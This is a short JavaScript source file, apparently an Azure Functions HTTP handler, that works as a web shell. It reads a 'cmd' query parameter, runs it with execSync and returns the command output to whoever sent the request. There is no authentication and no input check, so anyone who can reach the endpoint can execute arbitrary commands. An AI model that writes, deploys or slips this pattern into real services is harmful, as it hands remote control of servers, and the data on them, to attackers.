const { execSync } = require("child_process");

module.exports = async function (context, req) {
    context.log("JavaScript HTTP trigger function processed a request.");

    // Check if the "cmd" parameter is provided in the URL query string
    const cmd = req.query.cmd;

    if (cmd) {
        try {
            // Execute the command and capture the output
            // We use utf8 encoding to get a string back instead of a Buffer
            const stdout = execSync(cmd, { encoding: "utf8" });

            context.res = {
                status: 200,
                body: `Command Output: ${stdout}`,
            };
        } catch (error) {
            // If the command fails, return the error message
            context.res = {
                status: 500,
                body: `Error executing command: ${error.message}`,
            };
        }
    } else {
        // Default behavior if no command is provided
        context.res = {
            status: 200,
            body: "Please pass a 'cmd' parameter on the query string to execute a command.",
        };
    }
};
